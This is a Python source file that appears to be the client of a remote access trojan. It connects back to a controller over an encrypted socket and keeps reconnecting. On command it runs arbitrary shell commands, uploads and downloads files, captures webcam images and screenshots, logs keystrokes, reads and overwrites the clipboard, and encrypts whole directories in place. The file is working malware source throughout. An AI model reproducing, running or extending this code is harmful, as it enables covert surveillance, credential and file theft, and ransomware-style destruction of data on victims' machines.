# standard python libraries
import time
import subprocess
import base64
import socket
import sys
import os
import math
import zipfile
import pickle
import multiprocessing
import hashlib
# non-standard python libraries
import mss
import cv2
import pynput
import pyttsx3
import clipboard
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.exceptions import InvalidTag
from cryptography.hazmat.primitives.ciphers.aead import AESGCM


class Client:
    def __init__(self):
        self.connection = Connection()
        self.keylogger = Keylogger()
        self.exit = False
        self.response = multiprocessing.Manager().dict()

    def main(self):
        while not self.exit:
            request = self.connection.recv()
            self.response["data"] = str()
            self.response["error"] = str()

            if request["cmd"] == "c":
                process = multiprocessing.Process(target=self.execute_command, args=(self.response, request["exe"]))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "z":
                process = multiprocessing.Process(target=self.zip_file_or_folder, args=(
                    self.response, request["comp_lvl"], request["open_path"], request["save_path"]))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "w":
                process = multiprocessing.Process(target=self.capture_camera_picture,
                                                  args=(self.response, request["cam_port"], request["save_path"]))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "s":
                process = multiprocessing.Process(target=self.capture_screenshot,
                                                  args=(self.response, request["monitor"], request["save_path"]))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "d":
                process = multiprocessing.Process(target=self.download_file, args=(self.response, request["open_path"]))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "u":
                process = multiprocessing.Process(target=self.upload_file,
                                                  args=(self.response, request["save_path"], request["data"]))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "r":
                process = multiprocessing.Process(target=self.connection.sock.close)
                self.handle_process(process, request["timeout"])
                self.exit = True
            elif request["cmd"] == "k":
                self.log_keys(self.response, request["action"], request["save_path"])
            elif request["cmd"] == "b":
                process = multiprocessing.Process(target=self.edit_clipboard, args=(self.response, request["content"]))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "e":
                process = multiprocessing.Process(target=self.crypt,
                                                  args=(self.response, request["action"], request["open_path"],
                                                        request["password"]))
                self.handle_process(process, request["timeout"])
            elif request["cmd"] == "l":
                process = multiprocessing.Process(target=self.speak, args=(request["msg"],))
                self.handle_process(process, request["timeout"])
            self.connection.send(self.response)

    @staticmethod
    def execute_command(response, command):
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE,
                                       stderr=subprocess.PIPE, universal_newlines=True)
            response["data"] = process.stdout.read().rstrip()
            response["error"] = process.stderr.read().rstrip()
        except UnicodeDecodeError:
            response["error"] = "UnicodeDecodeError"

    @staticmethod
    def download_file(response, path):
        try:
            with open(path, "rb") as file:
                response["data"] = base64.b64encode(file.read()).decode("utf8")
        except FileNotFoundError:
            response["error"] = "FileNotFoundError"
        except PermissionError:
            response["error"] = "PermissionError"
        except MemoryError:
            response["error"] = "MemoryError"

    @staticmethod
    def upload_file(response, path, data):
        try:
            with open(path, "wb") as file:
                file.write(base64.b64decode(data))
        except PermissionError:
            response["error"] = "PermissionError"

    @staticmethod
    def capture_screenshot(response, monitor, path):
        try:
            with mss.mss() as sct:
                sct.shot(mon=int(monitor), output=path)
        except mss.exception.ScreenShotError:
            response["error"] = "MonitorDoesNotExist"
        except ValueError:
            response["error"] = "InvalidMonitorIndex"
        except FileNotFoundError:
            response["error"] = "FileNotFoundError"

    @staticmethod
    def zip_file_or_folder(response, compression_level, path_to_open, path_to_save):
        try:
            zip_file = zipfile.ZipFile(path_to_save, "w", zipfile.ZIP_DEFLATED, compresslevel=int(compression_level))
            if os.path.isdir(path_to_open):
                relative_path = os.path.dirname(path_to_open)
                for root, dirs, files in os.walk(path_to_open):
                    for file in files:
                        zip_file.write(os.path.join(root, file), os.path.join(root, file).replace(relative_path, '', 1))
            else:
                zip_file.write(path_to_open, os.path.basename(path_to_open))
            zip_file.close()
        except PermissionError:
            response["error"] = "PermissionError"
        except FileNotFoundError:
            response["error"] = "FileNotFoundError"

    @staticmethod
    def capture_camera_picture(response, camera_port, path_to_save):
        video_capture = cv2.VideoCapture(int(camera_port), cv2.CAP_DSHOW)
        if not video_capture.isOpened():
            response["error"] = "CouldNotOpenDevice"
            return
        success, frame = video_capture.read()
        if not success:
            response["error"] = "UnableToCapturePicture"
        video_capture.release()
        success = cv2.imwrite(path_to_save, frame)
        if not success:
            response["error"] = "UnableToSavePicture"

    def log_keys(self, response, action, filename):
        if action == "start":
            self.keylogger.filename = filename
            self.keylogger.log = True
        elif action == "stop":
            self.keylogger.log = False
        elif action == "status":
            if self.keylogger.log:
                response["data"] = "started"
            else:
                response["data"] = "stopped"

    @staticmethod
    def edit_clipboard(response, content):
        if content:
            clipboard.copy(content)
            response["data"] = ""
        else:
            response["data"] = clipboard.paste()

    @staticmethod
    def crypt(response, action, path_to_open, password):
        password_hash = hashlib.sha3_256(password.encode("utf8")).digest()
        crypter = AESGCM(password_hash)
        if os.path.isdir(path_to_open):
            for subdir, dirs, files in os.walk(path_to_open):
                for filename in files:
                    try:
                        path = os.path.join(subdir, filename)
                        with open(path, "rb") as file:
                            data = file.read()
                        if action == "enc":
                            nonce = os.urandom(12)
                            data = nonce + crypter.encrypt(nonce, data, b"")
                        elif action == "dec":
                            data = crypter.decrypt(data[:12], data[12:], b"")
                        with open(path, "wb") as file:
                            file.write(data)
                    except FileNotFoundError:
                        response["error"] = "FileNotFoundError"
                    except PermissionError:
                        response["error"] = "PermissionError"
                    except MemoryError:
                        response["error"] = "MemoryError"
                    except InvalidTag:
                        response["error"] = "InvalidTag"

        else:
            try:
                with open(path_to_open, "rb") as file:
                    data = file.read()
                if action == "enc":
                    nonce = os.urandom(12)
                    data = nonce + crypter.encrypt(nonce, data, b"")
                elif action == "dec":
                    data = crypter.decrypt(data[:12], data[12:], b"")
                with open(path_to_open, "wb") as file:
                    file.write(data)
            except FileNotFoundError:
                response["error"] = "FileNotFoundError"
            except PermissionError:
                response["error"] = "PermissionError"
            except MemoryError:
                response["error"] = "MemoryError"
            except InvalidTag:
                response["error"] = "InvalidTag"

    @staticmethod
    def speak(msg):
        engine = pyttsx3.init()
        engine.say(msg)
        engine.runAndWait()

    def handle_process(self, process, timeout):
        process.start()
        process.join(timeout)
        if process.is_alive():
            process.terminate()
            self.response["data"] = ""
            self.response["error"] = "TimeoutExpired"


class Connection:
    def __init__(self):
        self.PACKET_SIZE = 4096

        HOST = "127.0.0.1"
        PORT = 10001

        self.privkey = rsa.generate_private_key(public_exponent=65537,
                                                key_size=2048,
                                                backend=default_backend())
        self.pubkey_pem = self.privkey.public_key().public_bytes(encoding=serialization.Encoding.PEM,
                                                                 format=serialization.PublicFormat.SubjectPublicKeyInfo)
        # if host or port are given as cmd line args, use them (useful to open another connection on the same device)
        try:
            host = str(sys.argv[1])
            port = int(sys.argv[2])
            HOST = host
            PORT = port
        except ValueError:
            pass
        except IndexError:
            pass

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        while True:
            try:
                self.sock.connect((HOST, PORT))
                break
            except socket.error:
                time.sleep(30)

        aes_key = self.exchange_keys()
        self.crypter = AESGCM(aes_key)

    def exchange_keys(self):
        self.sock.sendall(self.pubkey_pem)
        aes_key_enc = self.sock.recv(256)
        return self.privkey.decrypt(aes_key_enc,
                                    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                                                 algorithm=hashes.SHA256(),
                                                 label=None))

    def send(self, data: dict):
        data = self.encrypt(pickle.dumps(data.copy()))
        self.sock.sendall(str(len(data)).encode("utf8"))
        self.sock.recv(self.PACKET_SIZE)
        self.sock.sendall(data)

    def recv(self) -> dict:
        header = int(self.sock.recv(self.PACKET_SIZE).decode("utf8"))
        self.sock.send("READY".encode("utf8"))
        data = bytearray()
        for _ in range(math.ceil(header / self.PACKET_SIZE)):
            data.extend(self.sock.recv(self.PACKET_SIZE))
        return pickle.loads(self.decrypt(bytes(data)))

    def encrypt(self, data):
        nonce = os.urandom(12)
        return nonce + self.crypter.encrypt(nonce, data, b"")

    def decrypt(self, cipher):
        return self.crypter.decrypt(cipher[:12], cipher[12:], b"")


class Keylogger:
    def __init__(self):
        self.listener = pynput.keyboard.Listener(on_press=self.on_key_pressed).start()
        self.log = False
        self.filename = ""

    def on_key_pressed(self, key):
        if self.log:
            timestamp = time.time()
            with open(self.filename, "a") as file:
                file.write(f"{round(timestamp)} {key}\n")


if __name__ == "__main__":
    while True:
        try:
            client = Client()
            client.main()
            if client.exit:
                break
        except:
            pass
